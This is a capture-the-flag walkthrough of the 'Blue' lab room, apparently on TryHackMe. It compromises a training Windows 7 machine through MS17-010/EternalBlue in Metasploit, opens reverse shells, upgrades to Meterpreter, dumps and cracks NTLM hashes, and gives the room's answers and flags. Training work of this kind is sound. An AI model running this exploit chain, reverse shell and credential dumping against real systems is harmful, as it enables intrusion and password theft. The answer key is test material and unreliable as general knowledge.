
# Blue - Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## [Task 1] Recon 19/03/2019


### Description

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Link to Ice, the sequel to Blue: Link

You can check out the third box in this series, Blaster, here: Link

The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html

Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.


### #1.1

Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)

~~~
$ sudo nmap -sV -sS -p- 10.10.130.234
[sudo] password for unknown: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 19:57 CEST
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 29.12% done; ETC: 20:00 (0:01:45 remaining)
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 20:01 (0:00:32 remaining)
Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 44.44% done; ETC: 20:01 (0:00:24 remaining)
Nmap scan report for 10.10.130.234
Host is up (0.073s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.47 seconds
~~~

### #1.2

How many ports are open with a port number under 1000?
~~~
3
~~~

### #1.3

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
Hint: Revealed by the ShadowBrokers, exploits an issue within SMBv1
~~~
ms17-010
~~~

You can confirm it with the following nmap script: https://svn.nmap.org/nmap/scripts/smb-vuln-ms17-010.nse
~~~
$ nmap -p 445 --script smb-vuln-ms17-010 10.10.130.234
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 20:10 CEST
Nmap scan report for 10.10.130.234
Host is up (0.075s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
~~~

## [Task 2] Gain Access 19/03/2019


### Description

Exploit the machine and gain a foothold.

### #2.1

Start Metasploit

~~~
msfconsole
~~~

### #2.2

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

First search for `ms17-010`:

~~~
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
~~~

We'll run this exploit: `exploit/windows/smb/ms17_010_eternalblue`

### #2.3

Show options and set the one required value. What is the name of this value? (All caps for submission)

~~~
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
~~~

Required option: `RHOST`

~~~
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.130.234
RHOST => 10.10.130.234
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.130.234    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
~~~

### #2.4

Run the exploit!

~~~
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.9.35.106:4444 
[*] 10.10.130.234:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.130.234:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.130.234:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.130.234:445 - Connecting to target for exploitation.
[+] 10.10.130.234:445 - Connection established for exploitation.
[+] 10.10.130.234:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.130.234:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.130.234:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.130.234:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.130.234:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.130.234:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.130.234:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.130.234:445 - Sending all but last fragment of exploit packet
[*] 10.10.130.234:445 - Starting non-paged pool grooming
[+] 10.10.130.234:445 - Sending SMBv2 buffers
[+] 10.10.130.234:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.130.234:445 - Sending final SMBv2 buffers.
[*] 10.10.130.234:445 - Sending last fragment of exploit packet!
[*] 10.10.130.234:445 - Receiving response from exploit packet
[+] 10.10.130.234:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.130.234:445 - Sending egg to corrupted connection.
[*] 10.10.130.234:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.9.35.106:4444 -> 10.10.130.234:49231) at 2020-04-30 11:46:47 -0700
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.130.234:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
~~~

Press `ENTER` for the DOS shell to appear

### #2.5

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

* Press ENTER to enter into the shell
* Press CTRL+Z and select "y" to background the shell

~~~
[...SNIP...]

[+] 10.10.126.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.126.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.126.60:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

<ENTER>

C:\Windows\system32>^Z
Background session 1? [y/N]  y
~~~

## [Task 3] Escalate 19/03/2019

### Description

Escalate privileges, learn how to upgrade shells in metasploit.

### #3.1

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected).

Hint: Google this: shell_to_meterpreter

~~~
msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter 
~~~

### #3.2

Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)

~~~
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
~~~

Required option: `SESSION`

### #3.3

Set the required option, you may need to list all of the sessions to find your target here. 

Hint: `sessions -l`

~~~
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.9.35.106:4444 -> 10.10.126.60:49168 (10.10.126.60)

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.
~~~

### #3.4

Run! If this doesn't work, try completing the exploit from the previous task once more. Hint: Command: `run` (or `exploit`)

~~~
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.35.106:4433 
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.126.60
[*] Meterpreter session 2 opened (10.9.35.106:4433 -> 10.10.126.60:49185) at 2020-04-30 23:17:33 -0700
[*] Stopping exploit/multi/handler

msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.9.35.106:4444 -> 10.10.126.60:49168 (10.10.126.60)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.9.35.106:4433 -> 10.10.126.60:49185 (10.10.126.60)
~~~

### #3.5

Once the meterpreter shell conversion completes, select that session for use. Hint: `sessions SESSION_NUMBER`

~~~
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.9.35.106:4444 -> 10.10.126.60:49168 (10.10.126.60)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.9.35.106:4433 -> 10.10.126.60:49185 (10.10.126.60)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
~~~

### #3.6

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

~~~
msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > shell
Process 2768 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
~~~

### #3.7

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

~~~
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 492   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 620   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 800   2808  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 808   1816  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1088  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1192  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1244  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1292  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1316  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1352  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1416  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1492  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1632  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1968  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2104  836   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2256  1316  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2392  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2452  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2484  808   powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 2648  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2768  2484  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 2808  712   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2840  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2872  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2912  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2984  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe

meterpreter > 
~~~

### #3.7

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

Let's migrate to PID 2912 (`svchost.exe`):

~~~
meterpreter > migrate 2912
[*] Migrating from 2484 to 2912...
[*] Migration completed successfully.
~~~

## [Task 4] Cracking 19/03/2019

### Description

Dump the non-default user's password and crack it!

### T4.1

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

~~~
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
~~~

Answer: `Jon`

### T4.2    

Copy this password hash to a file and research how to crack it. What is the cracked password?

Hint: This password can be found within the `rockyou.txt` wordlist.

~~~
$ ./john --format=NT --wordlist=rockyou.txt hashdump.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:00 DONE (2020-05-01 09:08) 3.278g/s 16721Kp/s 16721Kc/s 16729KC/s alr1979..alpus
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
~~~

John the Ripper has found the password associated to `Jon`: `alqfna22`

## [Task 5] Find flags! 

### Description

Find the three flags planted on this machine.

### T5.1

Flag1? (Only submit the flag contents {CONTENTS})

Let's move to the root directory to see how the file system looks like:

~~~
C:\Windows\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,408,102,912 bytes free
~~~

Our first flag is located at the root of `C:\`

~~~
C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>
~~~

### T5.2    

Flag2? *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*

Let's search for the other flags:

~~~
C:\>dir *flag* /s /b
dir *flag* /s /b
C:\flag1.txt
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk
C:\Users\Jon\Documents\flag3.txt
C:\Windows\System32\config\flag2.txt
~~~

Our second flag:
~~~
C:\>type \windows\system32\config\flag2.txt
type \windows\system32\config\flag2.txt
flag{sam_database_elevated_access}
~~~

### T5.3

flag3?

~~~
C:\>type \users\jon\documents\flag3.txt
type \users\jon\documents\flag3.txt
flag{admin_documents_can_be_valuable}
~~~